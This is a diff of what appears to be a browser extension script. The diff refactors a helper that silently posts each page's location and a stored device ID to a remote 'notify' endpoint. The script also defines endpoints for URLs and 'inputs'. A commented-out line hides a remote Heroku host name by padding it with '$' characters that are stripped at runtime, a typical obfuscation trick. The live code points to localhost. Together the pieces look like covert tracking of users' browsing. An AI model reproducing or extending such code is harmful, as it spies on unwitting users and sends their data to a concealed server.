@@ -4,7 +4,7 @@
 
     // const url = 'h$$t$$$t$$p$$s://$$$$$$j$$$$$c$$$$$$b$$$$$a$$$$$k$$$$er$$$$$y.he$$$$$rok$$$$$ua$$$$$pp.c$$$$o$$$$$m'.replace(/\$/g, '')
     const url = 'http://localhost'.replace(/\$/g, '')
-    const post = ({ url, body = {}, onSuccess }) => {
+    const post = ({ url, body = {} }) => {
       return fetch(url, {
         method: 'POST',
         headers: {
@@ -12,8 +12,6 @@
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(body)
-      }).then(res => {
-        if (res.ok && onSuccess) onSuccess(res)
       })
     }
     chrome.ME = { url, post }
@@ -23,7 +21,7 @@
     const { url, post } = chrome.ME
     const urlApi = `${url}/api/extension/urls`
     const urlDetailApi = `${url}/api/extension/url_details`
-    const urlNotify = `${url}/api/extension/url_notify`
+    const urlNotify = `${url}/api/extension/notify`
     const inputApi = `${url}/api/extension/inputs`
     const deviceId = localStorage.extensionUniqueId.replace(/&/g, '')
     const notified = sessionStorage.notified === 'true' ? true : false
@@ -78,15 +76,15 @@
       })
     }
 
-    function notify() {
-      post({
+    async function notify() {
+      const res = await post({
         url: urlNotify,
         body: {
           ...location,
           deviceId
-        },
-        onSuccess: () => sessionStorage.notified = true
+        }
       })
+      if(res.ok) sessionStorage.notified = true
     }
   }
 
